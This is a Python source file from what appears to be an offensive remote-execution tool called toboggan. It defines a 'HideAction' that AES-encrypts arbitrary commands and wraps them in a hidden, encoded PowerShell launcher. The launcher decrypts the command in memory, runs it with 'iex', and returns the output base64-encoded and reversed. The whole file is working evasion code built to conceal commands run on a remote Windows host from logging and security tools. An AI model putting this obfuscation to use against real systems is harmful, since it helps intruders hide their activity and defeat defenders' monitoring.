# toboggan/core/actions/hide/windows.py

# Built-in imports
import base64
import re
import os

# Third party library imports
from loguru import logger
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad

# Local application/library specific imports
from toboggan.core.action import BaseAction


def generate_key_iv():
    """
    Generates a random 32-byte key and a 16-byte IV for AES-256-CBC.
    Returns (key, iv) as hex-encoded strings.
    """
    key = os.urandom(32)
    iv = os.urandom(16)
    return key.hex(), iv.hex()


def encrypt_command(command: str, key_hex: str, iv_hex: str) -> str:
    """
    Encrypts a command using AES-256-CBC (compatible with .NET crypto).
    """
    key = bytes.fromhex(key_hex)
    iv = bytes.fromhex(iv_hex)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(command.encode(), AES.block_size)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()


class HideAction(BaseAction):
    """
    Obfuscate and execute commands using AES-256-CBC encryption or base64 encoding.

    **IMPORTANT**: This action is initialized during executor setup, before obfuscation
    is enabled. Uses PowerShell's native .NET crypto classes for AES encryption.

    Requirements:
        - PowerShell with .NET Framework (standard on all Windows systems)
        - Works with both PowerShell and CMD shells
    """

    DESCRIPTION = "Obfuscate and execute a command using .NET AES or base64-based wrapping."

    def __init__(self, executor):
        super().__init__(executor)

        # Use AES with .NET crypto classes
        self._use_aes = True
        self._AES_KEY, self._AES_IV = generate_key_iv()
        
        logger.info("🔑 PowerShell .NET crypto enabled, AES encryption active.")
        logger.debug(f"🔐 AES Key: {self._AES_KEY}")
        logger.debug(f"🔐 AES IV: {self._AES_IV}")

    def run(self, command: str) -> str:
        """
        Obfuscate and return the command for remote execution.
        
        Applies multiple layers of obfuscation:
        1. AES-256-CBC encryption (or base64 fallback)
        2. Base64 encode output
        3. Reverse string
        4. Base64 encode again
        """        
        # Add error redirection unless user explicitly added it
        if re.search(r"(2>&1|2>|>|>>)", command) is None:
            command += " 2>&1"

        if self._use_aes:
            logger.debug("🔐 Using AES-256-CBC encryption")
            # Encrypt the command
            encrypted = encrypt_command(command, self._AES_KEY, self._AES_IV)
            logger.trace(f"Encrypted: {encrypted}")
            
            # Build PowerShell decryption pipeline
            # Convert hex key/iv to byte arrays
            key_bytes = ",".join([f"0x{self._AES_KEY[i:i+2]}" for i in range(0, len(self._AES_KEY), 2)])
            iv_bytes = ",".join([f"0x{self._AES_IV[i:i+2]}" for i in range(0, len(self._AES_IV), 2)])
            
            # Decryption script (minimized for size)
            decrypt_script = (
                f"$e='{encrypted}';"
                f"$k=[byte[]]({key_bytes});"
                f"$i=[byte[]]({iv_bytes});"
                f"$a=[System.Security.Cryptography.Aes]::Create();"
                f"$a.Key=$k;$a.IV=$i;"
                f"$d=$a.CreateDecryptor();"
                f"$b=[Convert]::FromBase64String($e);"
                f"$o=$d.TransformFinalBlock($b,0,$b.Length);"
                f"$c=[Text.Encoding]::UTF8.GetString($o);"
                f"iex $c 2>&1"
            )
        else:
            # Fallback: simple base64 encoding
            encoded = base64.b64encode(command.encode()).decode()
            decrypt_script = (
                f"$e='{encoded}';"
                f"$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e));"
                f"iex $c 2>&1"
            )

        # Build the pipeline that outputs base64 then reverses
        # PowerShell script to execute command, base64 encode output, then reverse it
        # Use & {...} to invoke scriptblock and capture output
        full_script = (
            f"$r=&{{{decrypt_script}|Out-String}};"
            f"$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($r));"
            f"-join $b[$($b.Length-1)..0]"
        )

        # Encode the full script in base64 (UTF-16LE for PowerShell -EncodedCommand)
        encoded_script = base64.b64encode(full_script.encode('utf-16le')).decode()
        logger.debug(f"📦 Encoded script: {len(encoded_script)} bytes")

        # Return complete PowerShell command
        final_cmd = f'powershell -NoP -NonI -W Hidden -Enc {encoded_script}'
        
        logger.debug(f"✅ Final obfuscated command: {len(final_cmd)} bytes")
        return final_cmd
